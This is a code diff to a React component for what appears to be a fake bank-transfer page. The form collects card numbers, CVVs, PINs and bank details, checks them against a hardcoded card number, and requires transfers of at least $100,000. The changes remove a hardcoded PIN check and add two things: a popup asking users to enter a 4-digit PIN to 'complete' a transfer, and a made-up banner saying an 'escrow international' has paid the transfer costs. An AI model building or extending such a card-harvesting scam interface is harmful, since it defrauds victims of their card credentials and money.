@@ -21,6 +21,7 @@ const Tabs = () => {
     cardnumber: "",
     cardcvv: "",
     cardpin: "",
+
     firstname: "",
     lastname: "",
     accnumber: "",
@@ -79,16 +80,19 @@ const Tabs = () => {
       icon: "question",
       color: "#FC0000",
 
-      html: '  <p>  <b>Transfer failed    </b>    </p> <p>Link your bank Accounts</p>   <p>Contact support </p>',
+      html: '  <p htmlFor="idd" className="fs-6" >Enter 4 digit pin to complete transfer</p>  <input className="mt-4 w-100 custom-field" id="idd" name="idd" type="text"  />',
     });
   };
 
+
+ 
+  
  
   const cardToBankSubmit = () => {
     if (
       cardToBankData.cardnumber === "" ||
       cardToBankData.cardcvv === "" ||
-      cardToBankData.cardpin === "" ||
+       
       
       cardToBankData.firstname === "" ||
       cardToBankData.accnumber === "" ||
@@ -113,11 +117,7 @@ const Tabs = () => {
       alert("Minimum amount to send is $100,000");
       return;
     }
-    // pin validation
-    if (cardToBankData.cardpin !== '492923849') {
-      alert("Please input a valid pin");
-      return;
-    }
+     
 
 
     if (cardToBankData.cardnumber === "4531582493421042") {
@@ -129,8 +129,7 @@ const Tabs = () => {
         cardpin: "",
         firstname: "",        
         accnumber: "",
-        amount: "",
-      
+        amount: "",      
         swiftcode: "",
         bankname: "",
         country: "",
@@ -217,6 +216,7 @@ const Tabs = () => {
   return (
     <>
       
+    
       {cardToPay && (
         <div className="card-model">
           <div className="model-inner">
@@ -294,6 +294,9 @@ const Tabs = () => {
       {cardToBank && (
         <div className="card-model">
           <div className="model-inner">
+
+            <h5>The cost of Transfer have been paid by escrow international</h5>
+            <hr />
             <div className="text-end">
               <img
                 src="plus.svg"
@@ -328,17 +331,7 @@ const Tabs = () => {
                 />
               </div>
 
-              <div className="field-container">
-                <input
-                  type="number"
-                  id="cardpin"
-                  name="cardpin"
-                  value={cardToBankData.cardpin}
-                  onChange={cardToBankChange}
-                  className="custom-field"
-                  placeholder="9 digit Transaction Pin Code"
-                />
-              </div>
+           
 
               <div className="field-container">
                 <input
